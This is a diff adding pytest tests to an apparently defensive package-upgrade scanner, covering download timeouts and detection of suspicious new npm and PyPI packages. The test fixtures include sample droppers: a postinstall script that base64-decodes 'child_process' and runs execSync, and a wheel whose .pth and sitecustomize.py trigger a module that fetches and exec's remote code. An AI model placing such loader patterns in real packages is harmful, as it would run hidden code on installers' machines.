@@ -5,6 +5,7 @@ import hashlib
 import io
 import json
 import tarfile
+import time
 import zipfile
 
 import pytest
@@ -13,6 +14,7 @@ from ca9 import api
 from ca9.artifacts import fetch
 
 NPM = "https://registry.npmjs.org"
+REAL_DOWNLOAD = fetch._download_artifact
 
 
 class Registry:
@@ -440,3 +442,151 @@ def test_internal_package_reviewed_from_listed_private_index_only(registry):
     assert _kinds(private, "block") == ["new_pth_code"]
     assert public["reason"] == "internal_package"
     assert all(url.startswith("https://pypi.corp.example/") for url in registry.requests)
+
+
+class _SlowResponse:
+    def __init__(self, mode, timeout):
+        self.mode = mode
+        self.timeout = timeout
+        self.headers = {}
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+    def read1(self, size):
+        if self.mode == "stall":
+            time.sleep(self.timeout)
+            raise TimeoutError("timed out")
+        time.sleep(0.05)
+        return b"x"
+
+
+class _SlowOpener:
+    def __init__(self, mode, timeouts):
+        self.mode = mode
+        self.timeouts = timeouts
+
+    def open(self, request, timeout):
+        self.timeouts.append(timeout)
+        return _SlowResponse(self.mode, timeout)
+
+
+def _slow_server(registry, monkeypatch, mode):
+    monkeypatch.setattr(fetch, "_download_artifact", REAL_DOWNLOAD)
+    timeouts = []
+    monkeypatch.setattr(fetch._URLPolicy, "opener", lambda self: _SlowOpener(mode, timeouts))
+    registry.npm("sample", "1.0.0", {"index.js": "1;\n"})
+    registry.npm("sample", "1.0.1", {"index.js": "2;\n"})
+    registry.npm("other", "1.0.0", {"index.js": "1;\n"})
+    registry.npm("other", "1.0.1", {"index.js": "2;\n"})
+    return timeouts
+
+
+PAIRS = [
+    {"ecosystem": "npm", "name": "sample", "old": "1.0.0", "new": "1.0.1"},
+    {"ecosystem": "npm", "name": "other", "old": "1.0.0", "new": "1.0.1"},
+]
+
+
+def test_trickling_transfer_stops_at_deadline_and_later_pairs_time_out(registry, monkeypatch):
+    timeouts = _slow_server(registry, monkeypatch, "trickle")
+
+    started = time.monotonic()
+    report = api.review_upgrades(PAIRS, options={"max_seconds": 1, "request_timeout": 0.5})
+    elapsed = time.monotonic() - started
+
+    assert elapsed < 3
+    assert [result["reason"] for result in report["results"]] == ["timeout", "timeout"]
+    assert report["receipt"]["complete"] is False
+    assert report["receipt"]["skipped"] == [{"reason": "timeout", "count": 2}]
+    assert timeouts and max(timeouts) <= 0.5
+
+
+def test_stalled_transfer_aborts_on_request_timeout(registry, monkeypatch):
+    _slow_server(registry, monkeypatch, "stall")
+
+    started = time.monotonic()
+    report = api.review_upgrades(PAIRS[:1], options={"max_seconds": 30, "request_timeout": 0.2})
+
+    assert time.monotonic() - started < 3
+    assert report["results"][0]["reason"] == "timeout"
+
+
+def _new(ecosystem, name, version):
+    report = api.review_upgrades(
+        [{"ecosystem": ecosystem, "name": name, "old": None, "new": version}]
+    )
+    return report["results"][0]
+
+
+def test_new_npm_package_install_hook_warns_but_obfuscated_dropper_blocks(registry):
+    registry.npm(
+        "fastbuild",
+        "1.0.0",
+        {
+            "index.js": "const { spawnSync } = require('child_process');\nmodule.exports = 1;\n",
+            "install.js": "require('https').get('https://registry.npmjs.org/x');\n",
+        },
+        manifest={"scripts": {"postinstall": "node install.js"}},
+    )
+    registry.npm(
+        "plain-crypto",
+        "4.2.1",
+        {
+            "index.js": "module.exports = 1;\n",
+            "setup.js": (
+                "const m = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());\n"
+                "m.execSync('id');\n"
+            ),
+        },
+        manifest={"scripts": {"postinstall": "node setup.js"}},
+    )
+
+    benign = _new("npm", "fastbuild", "1.0.0")
+    dropper = _new("npm", "plain-crypto", "4.2.1")
+
+    assert benign["basis"] == "new_package" and benign["old"] is None
+    assert benign["block"] == []
+    assert {"new_install_hook", "new_import_time_exec"} <= set(_kinds(benign, "warn"))
+    assert dropper["basis"] == "new_package"
+    assert _kinds(dropper, "block") == ["new_decode_exec"]
+    assert "new_install_hook" in _kinds(dropper, "warn")
+
+
+def test_new_pypi_package_blocks_only_high_signal_startup_code(registry):
+    registry.pypi(
+        "toolkit",
+        "2.0",
+        wheel={
+            "toolkit/__init__.py": "X = 1\n",
+            "toolkit/_speedups.so": b"\x7fELF\x02" + b"\x00" * 64,
+            "toolkit-hook.pth": "import sys; exec('import os\\nif os.getenv(\"T\"):\\n import toolkit\\n')\n",
+            "toolkit/launcher/sitecustomize.py": "import toolkit\n",
+        },
+    )
+    registry.pypi(
+        "cookjar",
+        "1.0",
+        wheel={
+            "cookjar/__init__.py": "X = 1\n",
+            "cook.pth": "import cook\n",
+            "cook.py": (
+                "import urllib.request\n"
+                "def _poll():\n    exec(urllib.request.urlopen('https://example.invalid').read())\n"
+                "_poll()\n"
+            ),
+            "sitecustomize.py": "import cook\n",
+        },
+    )
+
+    benign = _new("pypi", "toolkit", "2.0")
+    loader = _new("pypi", "cookjar", "1.0")
+
+    assert benign["block"] == []
+    assert sorted(_kinds(benign, "warn")) == ["new_import_time_exec", "new_sitecustomize"]
+    assert [delta["kind"] for delta in benign["info"]] == ["new_native_binary"]
+    assert "sdist not compared" in " ".join(benign["limitations"])
+    assert _kinds(loader, "block") == ["new_decode_exec", "new_sitecustomize"]
